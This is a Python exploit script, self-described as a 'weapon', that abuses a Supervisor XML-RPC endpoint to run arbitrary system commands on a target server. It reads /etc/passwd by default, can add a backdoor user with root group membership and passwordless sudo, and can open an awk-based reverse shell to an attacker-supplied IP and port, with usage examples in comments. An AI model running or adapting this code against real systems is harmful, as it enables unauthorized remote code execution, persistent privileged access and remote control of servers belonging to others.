#!/usr/bin/env python3
import xmlrpc.client
import json
import optparse

#  python Supervisor绕过访问控制列表武器.py --ip 10.0.4.155 --port 9001 --lip 10.0.4.140 --lport 8888 --shell x
#  python Supervisor绕过访问控制列表武器.py --ip 10.0.4.155 --port 9001 --lip 10.0.4.140 --lport 8888 --ssh_name pt01
#  python Supervisor绕过访问控制列表武器.py --ip 10.0.4.155 --port 9001 --lip 10.0.4.140 --lport 8888 --ssh_name pt --ssh_pw abc123

ret = dict()

try:
	parser = optparse.OptionParser()
	parser.add_option('--ip', action="store", dest="ip")
	parser.add_option('--port', action="store", dest="port")
	parser.add_option('--lip', action="store", dest="lip")
	parser.add_option('--lport', action="store", dest="lport")
	parser.add_option('--cmd', action="store", dest="cmd", default='cat /etc/passwd')
	parser.add_option('--shell', action="store", dest="shell")
	parser.add_option('--ssh_name', action="store", dest="ssh_name")
	parser.add_option('--ssh_pw', action="store", dest="ssh_pw", default='abcd1234')

	options, args = parser.parse_args()
	ip = options.ip
	port = options.port
	lip = options.lip
	lport = options.lport
	ssh_name = options.ssh_name
	ssh_pw = options.ssh_pw
	target = "http://"+ip+":"+port
	command  = options.cmd


	if not options.shell:
		if ssh_name and ssh_pw:
			command = f"sudo useradd {ssh_name} && echo {ssh_name}:{ssh_pw} | chpasswd && sudo usermod -a -G root {ssh_name} && tee /etc/sudoers.d/{ssh_name} <<< '{ssh_name} ALL=(ALL) NOPASSWD: ALL'"

			ret['ssh_username'] = ssh_name
			ret['ssh_password'] = ssh_pw

		with xmlrpc.client.ServerProxy(target) as proxy:
			old = getattr(proxy, 'supervisor.readLog')(0,0)
			logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()
			getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format(command, logfile))
			result = getattr(proxy, 'supervisor.readLog')(0,0)

			ret['status'] = "success"
			ret['info'] = result[len(old):]

			print(json.dumps(ret))

	else:
		shell ="""awk 'BEGIN {{s = "/inet/tcp/0/{0}/{1}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null""".format(lip,lport)
		with xmlrpc.client.ServerProxy(target) as proxy:
			ret['status'] = "doing"
			print(json.dumps(ret))
			old = getattr(proxy, 'supervisor.readLog')(0,0)
			logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()
			getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format(shell, logfile))
			result = getattr(proxy, 'supervisor.readLog')(0,0)
			ret['status'] = "success"
			ret['info'] = result[len(old):]
			print(json.dumps(ret))
except:
	# ms17010 10s timeout
	status={"status":"fail","info":'' }
	ret['status'] = "fail"
	ret['info'] = ""
	print(json.dumps(ret))